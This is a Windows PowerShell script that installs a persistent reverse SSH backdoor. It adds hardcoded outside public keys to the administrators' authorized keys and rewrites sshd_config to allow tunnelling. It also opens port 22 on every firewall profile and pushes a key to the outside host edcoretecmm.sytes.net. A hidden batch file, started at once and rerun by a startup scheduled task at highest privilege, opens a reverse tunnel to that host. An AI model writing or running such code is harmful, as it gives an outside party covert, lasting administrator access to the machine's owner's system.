# This script must be executed with powershell running as administrator

# Ensure OpenSSH Client and Server are installed
$opensshClient = Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH.Client*'
$opensshServer = Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH.Server*'

if ($opensshClient.State -ne "Installed") {
    Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
}
if ($opensshServer.State -ne "Installed") {
    Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
}

# Start and enable sshd
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

# Configure the firewall
if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue)) {
    New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' `
        -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
}

# Add another rule that allows from any profile (Domain, Private, Public)
if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP-All" -ErrorAction SilentlyContinue)) {
    New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP-All' -DisplayName 'OpenSSH Server (All)' `
        -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 -Profile Any
}

# Get actual logged-in username and profile path (works even if running as SYSTEM)
$username = (Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty UserName)
$username = $username.Split('\')[-1]
$userProfile = "C:\Users\$username"
$sshDir = "$userProfile\.ssh"
$keyFile = "$sshDir\${username}_ed25519"
$pubKeyFile = "$keyFile.pub"
$user = "nobody1"
$remote_host = "edcoretecmm.sytes.net"
$receivedPort = 2004
$neutralPath = "C:\ProgramData\revssh"
#$logFile = "$neutralPath\rev_ssh.log"
$logFile = "$userProfile\rev_ssh.log"
$batFilePath = "$neutralPath\rev_ssh.bat"
#$batFilePath = "C:\Users\$username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rev_ssh.bat"

# Create C:\ProgramData\revssh if it doesn't exist
if (-not (Test-Path $neutralPath)) {
    New-Item -Path $neutralPath -ItemType Directory -Force | Out-Null
}

# Create SSH key pair if not exists
if (-not (Test-Path $keyFile)) {
    mkdir $sshDir -Force | Out-Null
    #ssh-keygen -t ed25519 -f $keyFile -N ""
	Start-Process -FilePath "ssh-keygen" -ArgumentList "-t ed25519 -f `"$keyFile`" -N `""" -q" -Wait
}
#
# Ensure the SSH directory exists
if (-not (Test-Path "$env:ProgramData\ssh")) {
    mkdir "$env:ProgramData\ssh" -Force | Out-Null
}

# Add remote public key to localhost
$nobody1_public = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHfWGblM3hG4bwrALVaC0mWhnzdPeolZjUAvd0l6Eolk nobody1@z6yg5ybv"
$nobody2_public = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDeQigM/aHDiVVl06SaUioJ9yll+4v+OsADC8WYdSLWz nobody2@z6yg5ybv"

# Ensure the SSH directory exists in ProgramData
$adminAuthKeysPath = "$env:ProgramData\ssh\administrators_authorized_keys"
if (-not (Test-Path "$env:ProgramData\ssh")) {
    mkdir "$env:ProgramData\ssh" -Force | Out-Null
}

# Ensure the SSH directory exists in ProgramData
$userAuthKeysPath = "$sshDir\authorized_keys"

# Add the correct public key based on $user
if ($user -eq "nobody1") {
    Add-Content -Path $adminAuthKeysPath -Value $nobody1_public
    Add-Content -Path $userAuthKeysPath -Value $nobody1_public
} elseif ($user -eq "nobody2") {
    Add-Content -Path $adminAuthKeysPath -Value $nobody2_public
    Add-Content -Path $userAuthKeysPath -Value $nobody2_public
} else {
    Write-Output "Unknown user: $user. No key added."
    exit 1
}

# Path to sshd_config
$sshConfigPath = "$env:ProgramData\ssh\sshd_config"

# Ensure the file exists
if (-not (Test-Path $sshConfigPath)) {
    Write-Error "sshd_config not found at $sshConfigPath. Is OpenSSH Server installed?"
    exit 1
}

# Backup the original config (safety measure)
if (Test-Path $sshConfigPath) {
    Copy-Item -Path $sshConfigPath -Destination "$sshConfigPath.bak" -Force
}

# Define the exact config you want
$requiredSettings = @"
Port 22
ListenAddress 0.0.0.0
PubkeyAuthentication yes
AuthorizedKeysFile .ssh/authorized_keys .ssh/authorized_keys2
PasswordAuthentication no
AllowAgentForwarding yes
AllowTcpForwarding yes
GatewayPorts yes
PermitTTY yes
TCPKeepAlive yes
PermitTunnel yes
"@

# Overwrite sshd_config with your custom settings
Set-Content -Path $sshConfigPath -Value $requiredSettings

# Restart SSH service to apply changes
Restart-Service sshd -Force
Write-Host "[+] sshd_config has been fully configured with secure settings."

# Set correct permissions
icacls.exe "$env:ProgramData\ssh\administrators_authorized_keys" /inheritance:r /grant ""*S-1-5-32-544:F"" /grant "SYSTEM:F"
#icacls.exe "$env:USERPROFILE\.ssh\authorized_keys" /inheritance:r /grant "${env:USERNAME}:(F)" /grant "SYSTEM:F"
#icacls.exe "$keyFile" /grant "${env:USERNAME}:(F)"
#icacls.exe "$keyFile" /grant "SYSTEM:F"

# Create an accesible version of ssh
$targetPath = "C:\ProgramData\ssh_portable"
New-Item -ItemType Directory -Path $targetPath -Force
Copy-Item -Path "C:\Windows\System32\OpenSSH\*" -Destination $targetPath -Recurse


# Add public key to remote server
$publicKey = (Get-Content $pubKeyFile -Raw).Trim()

#ssh -o "StrictHostKeyChecking=no" -i $keyFile $user@$remote_host "mkdir -p ~/.ssh && echo '$publicKey' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
& "C:\ProgramData\ssh_portable\ssh.exe" -o "StrictHostKeyChecking=no" -i $keyFile "$user@$remote_host" "mkdir -p ~/.ssh && echo '$publicKey' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"

# Create the batch content with properly escaped quotes
#$batContent = @"
#@echo off
#echo [INFO] Starting reverse SSH tunnel at %date% %time% by %USERNAME% >> "$logFile"
#timeout /t 10 /nobreak > nul
#"C:\Windows\System32\OpenSSH\ssh.exe" -o "StrictHostKeyChecking=no" -o "ExitOnForwardFailure=yes" -i "$keyFile" -N -f -R ${receivedPort}:127.0.0.1:22 ${user}@${remote_host} >> "$logFile" 2>&1
#"@

# Setup powershell as default shell
New-ItemProperty -Path "HKLM:\SOFTWARE\OpenSSH" -Name DefaultShell -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -PropertyType String -Force

# Create the batch content with properly escaped quotes
$batContent = @"
@echo off
echo [INFO] Trying reverse SSH tunnel at %%date%% %%time%% by %%USERNAME%% using $receivedPort port on remote host>> "$logFile"
timeout /t 30 /nobreak > nul
""C:\ProgramData\ssh_portable\ssh.exe"" -o "StrictHostKeyChecking=no" -o "ExitOnForwardFailure=yes" -i "$keyFile" -N -f -R $receivedPort`:127.0.0.1`:22 $user@$remote_host >> "$logFile" 2>&1
if %%ERRORLEVEL%% EQU 0 (
    echo [SUCCESS] SSH tunnel established successfully at %date% %time% >> "$logFile"
) else (
    echo [ERROR] SSH tunnel failed with error code %ERRORLEVEL% at %date%% %time%% >> "$logFile"
)
"@


# Save the batch file
Set-Content -Path $batFilePath -Value $batContent -Encoding ASCII

# Run the reverse tunnel .bat file now (optional: comment out if you don't want it to start immediately)
Start-Process -FilePath "$batFilePath" -WindowStyle Hidden
#Start-Process -FilePath "$batFilePath"

# Try running the powershell command directly
#$command = "`"C:\ProgramData\ssh_portable\ssh.exe`" -o StrictHostKeyChecking=no -o ExitOnForwardFailure=yes -i `"$keyFile`" -N -f -R $receivedPort`:127.0.0.1`:22 $user@$remote_host"

#$psi = New-Object System.Diagnostics.ProcessStartInfo
#$psi.FileName = "powershell.exe"
#$psi.Arguments = "-Command $command"
#$psi.WindowStyle = 'Hidden'
#$psi.CreateNoWindow = $true
#$psi.UseShellExecute = $false


$taskName = "ReverseSSHTunnel"

# Define the action to run the reverse SSH tunnel batch file
#$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c `"$batFilePath`""
$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c `"$batFilePath`""

# Remove the task if it already exists
if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
}

# Schedule the task
$trigger = New-ScheduledTaskTrigger -AtStartup
# Set ExecutionTimeLimit to zero to indicate no time limit
$settings = New-ScheduledTaskSettingsSet `
    -StartWhenAvailable `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -ExecutionTimeLimit ([TimeSpan]::Zero)

Register-ScheduledTask -TaskName $taskName `
    -Trigger $trigger `
    -Action $action `
    -Settings $settings `
    -RunLevel Highest


#Register-ScheduledTask -TaskName $taskName `
#    -Trigger $trigger `
#    -Action $action `
#    -Settings $settings `
#    -RunLevel Highest `
#    -User $username

Write-Host "`n[!] Success! SSH reverse tunnel batch file created and scheduled. Path: $batFilePath."
